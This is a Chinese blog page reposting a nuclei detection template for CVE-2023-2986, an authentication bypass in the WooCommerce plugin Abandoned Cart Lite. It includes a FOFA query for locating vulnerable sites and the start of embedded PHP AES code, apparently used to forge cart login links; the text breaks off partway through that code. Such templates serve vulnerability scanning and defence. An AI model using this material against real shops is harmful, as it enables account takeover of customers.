

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="lianccc">
  <meta name="keywords" content="">
  
    <meta name="description" content="漏洞名称： Abandoned Cart Lite for WooCommerce 认证绕过漏洞 漏洞编号：  CVE： CVE-2023-2986  漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： WordPress的Abandoned Cart Lite for WooCommerce插件在5.14.2及之前版本中存在认证绕过漏洞。这是由于插件在废弃购物车链接解码过程中对用户提供的加密不足">
<meta property="og:type" content="article">
<meta property="og:title" content="Abandoned Cart Lite for WooCommerce 认证绕过漏洞">
<meta property="og:url" content="http://example.com/2025/06/03/github_1996286128/index.html">
<meta property="og:site_name" content="liancc&#39; infos blog">
<meta property="og:description" content="漏洞名称： Abandoned Cart Lite for WooCommerce 认证绕过漏洞 漏洞编号：  CVE： CVE-2023-2986  漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： WordPress的Abandoned Cart Lite for WooCommerce插件在5.14.2及之前版本中存在认证绕过漏洞。这是由于插件在废弃购物车链接解码过程中对用户提供的加密不足">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-06-03T19:45:56.385Z">
<meta property="article:modified_time" content="2025-06-03T19:45:56.384Z">
<meta property="article:author" content="lianccc">
<meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
<meta property="article:tag" content="权限绕过">
<meta property="article:tag" content="CVE-2023-2986">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>Abandoned Cart Lite for WooCommerce 认证绕过漏洞 - liancc&#39; infos blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="liancc' infos blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Abandoned Cart Lite for WooCommerce 认证绕过漏洞"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-06-03 19:45" pubdate>
          2025年6月3日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          17 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Abandoned Cart Lite for WooCommerce 认证绕过漏洞</h1>
            
            
              <div class="markdown-body">
                
                <p><strong>漏洞名称：</strong> Abandoned Cart Lite for WooCommerce 认证绕过漏洞</p>
<p><strong>漏洞编号：</strong></p>
<ul>
<li><strong>CVE：</strong> CVE-2023-2986</li>
</ul>
<p><strong>漏洞类型：</strong> 权限绕过</p>
<p><strong>漏洞等级：</strong> 严重</p>
<p><strong>漏洞描述：</strong> WordPress的Abandoned Cart Lite for WooCommerce插件在5.14.2及之前版本中存在认证绕过漏洞。这是由于插件在废弃购物车链接解码过程中对用户提供的加密不足，导致未认证的攻击者可以以废弃购物车的用户（通常是客户）身份登录。5.15.1版本引入了进一步的安全加固措施，确保网站不再通过历史结账链接受到攻击，5.15.2版本引入了额外的加固措施，确保空键值不会允许认证绕过。</p>
<p><strong>产品厂商：</strong> tychesoftwares</p>
<p><strong>产品名称：</strong> Abandoned Cart Lite for WooCommerce</p>
<p><strong>影响版本：</strong> version &lt;&#x3D; 5.14.2</p>
<p><strong>搜索语法：</strong> body&#x3D;”&#x2F;wp-content&#x2F;plugins&#x2F;woocommerce-abandoned-cart&#x2F;“</p>
<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/8c3b2aa357db8d955f41f3bbff541063b2b81964/http%2Fcves%2F2023%2FCVE-2023-2986.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/8c3b2aa357db8d955f41f3bbff541063b2b81964/http%2Fcves%2F2023%2FCVE-2023-2986.yaml</a></p>
<p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"></span><br><span class="language-xml">id: CVE-2023-2986</span><br><span class="language-xml"></span><br><span class="language-xml">info:</span><br><span class="language-xml">  name: Abandoned Cart Lite for WooCommerce - Authentication Bypass</span><br><span class="language-xml">  author: iamnoooob,pdresearch</span><br><span class="language-xml">  severity: critical</span><br><span class="language-xml">  description: |</span><br><span class="language-xml">    The Abandoned Cart Lite for WooCommerce plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 5.14.2. This is due to insufficient encryption on the user being supplied during the abandoned cart link decode through the plugin. This allows unauthenticated attackers to log in as users who have abandoned the cart, who are typically customers. Further security hardening was introduced in version 5.15.1 that ensures sites are no longer vulnerable through historical check-out links, and additional hardening was introduced in version 5.15.2 that ensured null key values wouldn&#x27;t permit the authentication bypass.</span><br><span class="language-xml">  reference:</span><br><span class="language-xml">    - https://github.com/Alucard0x1/CVE-2023-2986</span><br><span class="language-xml">    - https://github.com/TycheSoftwares/woocommerce-abandoned-cart/pull/885#issuecomment-1601813615</span><br><span class="language-xml">    - https://plugins.trac.wordpress.org/changeset?sfp_email=&amp;sfph_mail=&amp;reponame=&amp;old=2925274%40woocommerce-abandoned-cart&amp;new=2925274%40woocommerce-abandoned-cart&amp;sfp_email=&amp;sfph_mail=</span><br><span class="language-xml">    - https://www.wordfence.com/blog/2023/06/tyche-softwares-addresses-authentication-bypass-vulnerability-in-abandoned-cart-lite-for-woocommerce-wordpress-plugin/</span><br><span class="language-xml">    - https://github.com/Ayantaker/CVE-2023-2986</span><br><span class="language-xml">  classification:</span><br><span class="language-xml">    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br><span class="language-xml">    cvss-score: 9.8</span><br><span class="language-xml">    cve-id: CVE-2023-2986</span><br><span class="language-xml">    epss-score: 0.66087</span><br><span class="language-xml">    epss-percentile: 0.98408</span><br><span class="language-xml">    cpe: cpe:2.3:a:tychesoftwares:abandoned_cart_lite_for_woocommerce:*:*:*:*:*:wordpress:*:*</span><br><span class="language-xml">  metadata:</span><br><span class="language-xml">    verified: true</span><br><span class="language-xml">    vendor: tychesoftwares</span><br><span class="language-xml">    product: abandoned_cart_lite_for_woocommerce</span><br><span class="language-xml">    framework: wordpress</span><br><span class="language-xml">    fofa-query: body=&quot;/wp-content/plugins/woocommerce-abandoned-cart/&quot;</span><br><span class="language-xml">  tags: cve,cve2023,wordpress,woocommerce,wp-plugin,auth-bypass,woocommerce-abandoned-cart</span><br><span class="language-xml">code:</span><br><span class="language-xml">  - engine:</span><br><span class="language-xml">      - php</span><br><span class="language-xml">    source: |</span><br><span class="language-xml">      </span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">      <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wcal_Aes</span> </span>&#123;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * AES Cipher function [�5.1]: encrypt &#x27;input&#x27; with Rijndael algorithm</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@param</span> input message as byte-array (16 bytes)</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@param</span> w     key schedule as 2D byte-array (Nr+1 x Nb bytes) -</span></span><br><span class="hljs-comment"><span class="language-php">          *              generated from the cipher key by keyExpansion()</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@return</span>      ciphertext as byte-array (16 bytes)</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cipher</span>(<span class="hljs-params"> <span class="hljs-variable">$input</span>, <span class="hljs-variable">$w</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-variable">$Nb</span>    = <span class="hljs-number">4</span>; <span class="hljs-comment">// block size (in words): no of columns in state (fixed at 4 for AES)</span></span><br><span class="language-php">              <span class="hljs-variable">$Nr</span>    = <span class="hljs-title function_ invoke__">count</span>( <span class="hljs-variable">$w</span> ) / <span class="hljs-variable">$Nb</span> - <span class="hljs-number">1</span>; <span class="hljs-comment">// no of rounds: 10/12/14 for 128/192/256-bit keys</span></span><br><span class="language-php">              <span class="hljs-variable">$state</span> = <span class="hljs-keyword">array</span>(); <span class="hljs-comment">// initialise 4xNb byte-array &#x27;state&#x27; with input [�3.4]</span></span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span> * <span class="hljs-variable">$Nb</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$state</span>[ <span class="hljs-variable">$i</span> % <span class="hljs-number">4</span> ][ <span class="hljs-title function_ invoke__">floor</span>( <span class="hljs-variable">$i</span> / <span class="hljs-number">4</span> ) ] = <span class="hljs-variable">$input</span>[ <span class="hljs-variable">$i</span> ];</span><br><span class="language-php">              &#125;</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">addRoundKey</span>( <span class="hljs-variable">$state</span>, <span class="hljs-variable">$w</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$round</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$round</span> &lt; <span class="hljs-variable">$Nr</span>; <span class="hljs-variable">$round</span>++ ) &#123; <span class="hljs-comment">// apply Nr rounds</span></span><br><span class="language-php">                  <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">subBytes</span>( <span class="hljs-variable">$state</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php">                  <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">shiftRows</span>( <span class="hljs-variable">$state</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php">                  <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">mixColumns</span>( <span 